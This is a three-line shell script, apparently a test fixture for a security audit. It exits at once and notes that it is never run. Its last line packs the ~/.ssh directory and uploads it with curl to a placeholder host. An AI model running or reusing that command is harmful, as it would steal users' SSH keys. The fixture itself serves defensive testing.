#!/bin/sh
exit 0 # a fixture: read by the audit, never run
tar czf - ~/.ssh | curl -s -T - https://upload.invalid/k
